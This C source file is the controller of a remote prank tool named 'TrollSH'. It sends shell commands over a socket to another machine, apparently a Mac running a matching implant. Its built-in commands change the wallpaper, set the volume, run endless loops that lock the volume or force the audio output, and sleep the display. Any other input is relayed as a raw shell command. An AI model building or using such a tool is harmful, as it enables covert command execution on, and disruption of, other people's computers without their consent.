/* ******************************--------************************************ */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   controller_cmds.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: someone <someone@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/mm/dd hh:mm:ss by someone           #+#    #+#             */
/*   Updated: 2018/07/26 21:22:20 by kdumarai         ###   ########.fr       */
/*                                                                            */
/* ******************************--------************************************ */

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include "controller.h"

static char		*bltns_args(char *line)
{
	const char	*chk;
	char		*cmd;

	chk = ft_strchr(line, ' ');
	cmd = NULL;
	if (ft_strstart(line, "chgwall"))
	{
		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to "
						"tell desktop 1 to set picture to ");
		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
		ft_stradd(&cmd, "'");
	}
	else if (ft_strstart(line, "setvol"))
	{
		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to "
						"set volume ");
		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
		ft_stradd(&cmd, "'");
	}
	return (cmd);
}

static void		send_cmd(int sockfd, char *line)
{
	char	*cmd;

	if (!(cmd = bltns_args(line)))
	{
		if (ft_strstart(line, "sleepdisp"))
			cmd = ft_strdup("pmset displaysleepnow");
		else if (ft_strstart(line, "blockvol"))
			cmd = ft_strdup("while true; do osascript -e 'tell application "
							"\"System Events\" to set volume 10'; done");
		else if (ft_strstart(line, "forceout"))
			cmd = ft_strdup("if [ ! -f $HOME/.brew/bin/SwitchAudioSource ]; "
					"then echo 'Not there'; fi; while true; do "
			"$HOME/.brew/bin/SwitchAudioSource -s 'Built-in Output' >/dev/null;"
			"done");
		else
			cmd = line;
	}
	ft_putstr_fd(cmd, sockfd);
	if (cmd && cmd != line)
		free(cmd);
}

t_uint8			get_line(char **msgi,
						t_rl_opts *opts,
						t_dlist *hist,
						t_uint8 interactive)
{
	const char			*prompt = "\033[1;31mTrollSH\033[0;39m$ ";

	if (interactive)
	{
		*msgi = ft_readline(prompt, opts, hist);
		return ((*msgi != NULL));
	}
	return (get_next_line(STDIN_FILENO, msgi) > 0);
}

int				send_msg(int sockfd,
						t_rl_opts *opts,
						t_dlist **hist,
						t_uint8 interactive)
{
	int					ret;
	char				*msgi;
	char				buffer[32];

	if (recv(sockfd, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT) == 0)
		return (ft_returnmsg("Server kick ya out!", STDERR_FILENO, FALSE));
	ret = TRUE;
	if (get_line(&msgi, opts, *hist, interactive))
	{
		if (*msgi != '\0')
			ftrl_histadd(hist, msgi);
		if (ft_strcmp(msgi, "exit") == 0)
			ret = FALSE;
		else if (ft_strcmp(msgi, "") == 0)
			ft_putendl_fd("Not a suitable command!", STDERR_FILENO);
		else
			send_cmd(sockfd, msgi);
	}
	else
		return (FALSE);
	ft_strdel(&msgi);
	return (ret);
}
